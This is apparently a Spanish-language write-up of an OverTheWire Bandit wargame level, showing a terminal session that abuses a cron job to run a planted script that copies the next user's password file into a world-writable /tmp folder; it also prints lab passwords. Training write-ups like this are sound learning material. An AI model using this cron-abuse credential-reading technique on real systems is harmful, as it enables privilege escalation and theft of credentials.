# Level 23 -> 24
---
## Objectivo
A program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in **/etc/cron.d/** for the configuration and see what command is being executed.

**NOTE:** This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

**NOTE 2:** Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…

---
## Datos de acceso
- user -> **bandit23**
- Passwor -> QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G
- host ->  **bandit.labs.overthewire.org**
- port -> **2220**

---
## Solución

``` shell
bandit23@bandit:~$ cd /etc/cron.d
bandit23@bandit:/etc/cron.d$ ls
cronjob_bandit15_root  cronjob_bandit17_root  cronjob_bandit22  cronjob_bandit23  cronjob_bandit24  cronjob_bandit25_root
bandit23@bandit:/etc/cron.d$ cat cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
bandit23@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh 
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname
echo "Executing and deleting all scripts in /var/spool/$myname:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done

bandit23@bandit:/etc/cron.d$ mkdir /tmp/password24tmp
bandit23@bandit:/etc/cron.d$ nano /tmp/password24tmp/password
Unable to create directory /home/bandit23/.nano: Permission denied
It is required for saving/loading search history or cursor positions.

Press Enter to continue

bandit23@bandit:/etc/cron.d$ chmod 777 -R /tmp/password24tmp

bandit23@bandit:/etc/cron.d$ cd /tmp/password24tmp
bandit23@bandit:/tmp/password24tmp$ ls
password
bandit23@bandit:/tmp/password24tmp$ nano my_script.sh
Unable to create directory /home/bandit23/.nano: Permission denied
It is required for saving/loading search history or cursor positions.

Press Enter to continue

bandit23@bandit:/tmp/password24tmp$ ls
my_script.sh  password
bandit23@bandit:/tmp/password24tmp$ cat my_script.sh 
#!/bin/bash

cat /etc/bandit_pass/bandit24 > /tmp/password24tmp/password

bandit23@bandit:/tmp/password24tmp$ chmod 777 my_script.sh 
bandit23@bandit:/tmp/password24tmp$ cp my_script.sh /var/spool/bandit24/
bandit23@bandit:/tmp/password24tmp$ cat password 
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
bandit23@bandit:/tmp/password24tmp$ 



``` 



---
## Notas adicionales

Se crea un script que aprovecha los permisos del usuario bandit24 para obtener su contraseña.

 ### linux
 **#!/bin**/**bash**: Esta linea indica donde se encuentra el interprete de comandos en nuestro sistema.



---
## Referencias
http://trajano.us.es/~fjfj/shell/shellscript.htm#_Toc444081192
